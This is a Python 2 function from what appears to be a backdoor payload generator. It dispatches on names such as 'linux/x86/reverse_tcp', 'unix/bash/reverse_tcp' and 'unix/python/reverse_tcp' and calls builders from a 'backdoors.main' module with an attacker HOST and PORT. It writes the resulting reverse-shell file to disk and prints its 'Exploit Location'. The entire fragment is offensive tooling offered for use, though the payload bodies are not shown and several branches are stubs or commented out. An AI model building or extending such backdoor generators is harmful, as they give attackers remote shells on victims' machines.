def process( data, HOST, PORT, logger=True):
	logfile = None
	extension = None
	if logger == True:
		from random import randint
		from os import path
		while True:
			logfile = "%s." % str(randint(0, 999999999))
			if not path.isfile(logfile):
				break
	else:
		logfile = logger


	if data == "linux/x86/reverse_tcp":
		from backdoors.main import linx86reverse_tcp
		extension = "elf"
		logs = linx86reverse_tcp( HOST,PORT)
	elif data == "osx/x86/reverse_tcp":
		from backdoors.main import macosx86reverse_tcp
		extension = "macho"
		logs = macosx86reverse_tcp( HOST,PORT)
	elif data == "linux/x64/reverse_tcp":
		from backdoors.main import linx64reverse_tcp
		extension = "elf"
		logs = linx64reverse_tcp( HOST,PORT)
	#elif data == "osx/x64/reverse_tcp":
		#pass
	#elif data == "windows/x86/reverse_tcp":
		#from backdoors.main import winreverse_tcp
		#extension = "exe"
		#logs = winreverse_tcp( HOST,PORT)
		



	elif data == "php/reverse_tcp":
		pass
	elif data == "asp/reverse_tcp":
		pass
	elif data == "jsp/reverse_tcp":
		pass
	elif data == "war/reverse_tcp":
		pass


	elif data == "unix/python/reverse_tcp":
		from backdoors.main import pyreverse_tcp
		extension = "py"
		logs = pyreverse_tcp( HOST,PORT)
	elif data == "unix/perl/reverse_tcp":
		from backdoors.main import plreverse_tcp
		extension = "pl"
		logs = plreverse_tcp( HOST,PORT)
	elif data == "unix/bash/reverse_tcp":
		from backdoors.main import shreverse_tcp
		extension = "sh"
		logs = shreverse_tcp( HOST,PORT)
	elif data == "unix/ruby/reverse_tcp":
		from backdoors.main import rbreverse_tcp
		extension = "rb"
		logs = rbreverse_tcp( HOST,PORT)


	savefile = [logfile if logger != True else logfile+extension]
	if data in [
				"linux/x86/reverse_tcp",
				"osx/x86/reverse_tcp",
				"osx/x64/reverse_tcp",
				"windows/x86/reverse_tcp"
				]:

		exploit = open(savefile[0], "wb")
		exploit.write(logs.decode("hex"))
	else:
		exploit = open(savefile[0], "w")
		exploit.write(logs)
	exploit.close()

	import os
	path = os.getcwd()+os.sep+savefile[0].replace("\n", "")
	print "\n\n\t Exploit Location : %s \n\n" % path



